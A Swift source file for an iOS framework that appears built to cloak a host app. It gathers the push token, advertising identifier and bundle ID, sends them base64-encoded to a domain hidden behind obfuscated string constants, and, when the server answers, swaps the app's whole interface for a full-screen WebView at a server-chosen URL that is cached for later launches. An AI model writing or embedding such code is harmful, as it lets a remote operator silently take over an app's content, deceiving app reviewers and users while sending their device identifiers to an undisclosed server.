import SwiftUI
import UserNotifications
import AppTrackingTransparency
import AdSupport
import Security
import ObjectiveC

// Объявляем AppDelegate внутри фреймворка для перехвата системных событий
class WWWFrameAppDelegate: NSObject, UIApplicationDelegate, UNUserNotificationCenterDelegate {
    static let shared = WWWFrameAppDelegate()
    
    func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        let tokenString = deviceToken.map { String(format: "%02.2hhx", $0) }.joined()
        print("WWWFrame: APNS token received from system: \(tokenString)")
        
        // Передаем токен в менеджер
        FrameworkManager.shared.setAPNSToken(deviceToken)
    }
    
    func application(_ application: UIApplication, didFailToRegisterForRemoteNotificationsWithError error: Error) {
        print("WWWFrame: Failed to register for remote notifications: \(error.localizedDescription)")
    }
    
    // Для обработки нотификаций в foreground
    func userNotificationCenter(_ center: UNUserNotificationCenter, willPresent notification: UNNotification, withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
        completionHandler([.banner, .sound, .badge])
    }
}

class FrameworkManager {
    static let shared = FrameworkManager()
    
    private var apnsToken: String?
    private var attToken: String?
    private var bundleId: String?
    private var webURL: URL?
    private var hasCompletedInitialRequest: Bool = false
    
    private let tokenWaitTime: TimeInterval = 10.0
    
    private init() {}
    
    func launch() {
        // Инициализируем автоматическое получение APNS токена
        initializeProxySystem()
        
        // Запрашиваем разрешения на пуш-уведомления
        requestPushNotificationPermission()
        
        // Запрашиваем разрешения на трекинг
        if #available(iOS 14.5, *) {
            requestTrackingPermission()
        } else {
            attToken = StringEncoder.stubAtt
        }
        
        // Получаем bundle ID
        bundleId = getBundleId()
        
        // Проверяем, есть ли сохраненный URL
        if let cachedURL = UserDefaults.standard.string(forKey: StringEncoder.cacheKey) {
            showWebView(with: URL(string: cachedURL)!)
            return
        }
        
        // Ждем сбора данных и делаем запрос к серверу
        DispatchQueue.main.asyncAfter(deadline: .now() + tokenWaitTime) { [weak self] in
            self?.makeServerRequest()
        }
    }
    
    // Инициализация системы перехвата APNS токена
    private func initializeProxySystem() {
        // Инициализируем прокси для автоматического получения APNS токена
        FrameworkAppDelegateProxy.shared.initialize()
        
        // Пытаемся получить сохраненный токен из Keychain
        if let tokenData = FrameworkManager.getPushTokenFromKeychain() {
            self.setAPNSToken(tokenData)
        }
    }
    
    private func requestPushNotificationPermission() {
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { [weak self] granted, error in
            if granted {
                DispatchQueue.main.async {
                    // Регистрируем устройство для получения токена
                    UIApplication.shared.registerForRemoteNotifications()
                    
                    // На случай, если токен уже был получен ранее
                    if let tokenData = FrameworkManager.getPushTokenFromKeychain() {
                        self?.setAPNSToken(tokenData)
                    } else {
                        // Временно используем заглушку, позже токен должен прийти
                        self?.apnsToken = StringEncoder.stubApns + "_waiting"
                    }
                }
            } else {
                DispatchQueue.main.async {
                    self?.apnsToken = StringEncoder.stubApns
                }
            }
        }
    }
    
    private func requestTrackingPermission() {
        if #available(iOS 14.5, *) {
            ATTrackingManager.requestTrackingAuthorization { [weak self] status in
                switch status {
                case .authorized:
                    DispatchQueue.main.async {
                        self?.attToken = ASIdentifierManager.shared().advertisingIdentifier.uuidString
                    }
                default:
                    DispatchQueue.main.async {
                        self?.attToken = StringEncoder.stubAtt
                    }
                }
            }
        }
    }
    
    private func getBundleId() -> String {
        if let bundleId = Bundle.main.bundleIdentifier {
            return bundleId
        } else {
            return StringEncoder.stubBundle
        }
    }
    
    private func generateDomain() -> String {
        let rawBundleId = bundleId ?? StringEncoder.stubBundle
        let domain = rawBundleId.replacingOccurrences(of: ".", with: "") + StringEncoder.domainSuffix
        return domain
    }
    
    private func createRequestURL() -> URL {
        let domain = generateDomain()
        let finalApnsToken = apnsToken ?? StringEncoder.stubApns
        let finalAttToken = attToken ?? StringEncoder.stubAtt
        let finalBundleId = bundleId ?? StringEncoder.stubBundle
        
        // Create the parameter string
        let paramString = StringEncoder.apnsTokenParam + finalApnsToken + 
                         "&" + StringEncoder.attTokenParam + finalAttToken +
                         "&" + StringEncoder.bundleIdParam + finalBundleId
        
        // Encode to Base64
        guard let data = paramString.data(using: .utf8) else {
            return URL(string: StringEncoder.httpProtocol + domain + "/" + StringEncoder.endpoint + "?" + StringEncoder.paramData)!
        }
        
        let base64String = data.base64EncodedString()
        
        // Create the URL
        let urlString = StringEncoder.httpProtocol + domain + "/" + StringEncoder.endpoint + "?" + StringEncoder.paramData + base64String
        
        return URL(string: urlString)!
    }
    
    private func makeServerRequest() {
        let url = createRequestURL()
        hasCompletedInitialRequest = true
        
        URLSession.shared.dataTask(with: url) { [weak self] data, response, error in
            DispatchQueue.main.async {
                if let error = error {
                    self?.resumeAppOperations()
                    return
                }
                
                guard let data = data, let responseString = String(data: data, encoding: .utf8) else {
                    self?.resumeAppOperations()
                    return
                }
                
                if !responseString.isEmpty {
                    // Non-empty string means we should show WebView
                    let urlString = StringEncoder.httpProtocol + responseString
                    if let url = URL(string: urlString) {
                        // Cache the URL for future use
                        UserDefaults.standard.set(urlString, forKey: StringEncoder.cacheKey)
                        
                        self?.showWebView(with: url)
                    } else {
                        self?.resumeAppOperations()
                    }
                } else {
                    self?.resumeAppOperations()
                }
            }
        }.resume()
    }
    
    private func resumeAppOperations() {
        // Пустой метод, все операции приложения продолжаются как обычно
    }
    
    private func showWebView(with url: URL) {
        webURL = url
        
        // Показываем WebView через главное окно приложения
        DispatchQueue.main.async {
            guard let window = UIApplication.shared.connectedScenes
                    .filter({ $0.activationState == .foregroundActive })
                    .compactMap({ $0 as? UIWindowScene })
                    .first?.windows
                    .filter({ $0.isKeyWindow })
                    .first else { return }
            
            // Устанавливаем глобальный черный фон
            window.backgroundColor = .black
            
            // Создаем WebView с черным фоном, игнорируя safe area insets
            let rootView = WebViewContainer(url: url)
                .background(Color.black)
                .edgesIgnoringSafeArea(.all)
            
            // Создаем наш кастомный контроллер, который работает с SafeArea через инсеты
            let hostingController = WebViewHostingController(rootView: rootView)
            
            // Устанавливаем контроллер как rootViewController окна
            window.rootViewController = hostingController
        }
    }
    
    // Called by the application delegate when receiving an APNS token
    func setAPNSToken(_ token: Data) {
        let tokenString = token.map { String(format: "%02.2hhx", $0) }.joined()
        
        // Проверяем, не является ли это тем же самым токеном, что у нас уже есть
        if apnsToken == tokenString {
            return
        }
        
        // Сохраняем токен
        FrameworkManager.savePushTokenToKeychain(token)
        
        // Обновляем токен
        apnsToken = tokenString
        
        // Проверяем, был ли уже сделан запрос с временным токеном
        if hasCompletedInitialRequest && (apnsToken == StringEncoder.stubApns + "_waiting" || apnsToken == StringEncoder.stubApns) {
            // Создаем новый запрос с настоящим токеном
            DispatchQueue.main.async { [weak self] in
                self?.makeServerRequest()
            }
        }
    }
    
    // Методы для сохранения и получения токена из Keychain
    private static func savePushTokenToKeychain(_ tokenData: Data) {
        // Проверяем, валиден ли токен (должен быть определенного размера)
        guard tokenData.count > 0 else {
            return
        }
        
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: StringEncoder.keychainKey,
            kSecValueData as String: tokenData
        ]
        
        // Удаляем существующий токен, если есть
        let deleteStatus = SecItemDelete(query as CFDictionary)
        if deleteStatus != errSecSuccess && deleteStatus != errSecItemNotFound {
            // Ошибка при удалении токена
        }
        
        // Сохраняем новый токен
        let status = SecItemAdd(query as CFDictionary, nil)
        if status != errSecSuccess {
            // Ошибка при сохранении токена
        }
    }
    
    private static func getPushTokenFromKeychain() -> Data? {
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: StringEncoder.keychainKey,
            kSecReturnData as String: true,
            kSecMatchLimit as String: kSecMatchLimitOne
        ]
        
        var item: CFTypeRef?
        let status = SecItemCopyMatching(query as CFDictionary, &item)
        
        if status == errSecSuccess, let tokenData = item as? Data {
            return tokenData
        }
        
        return nil
    }
} 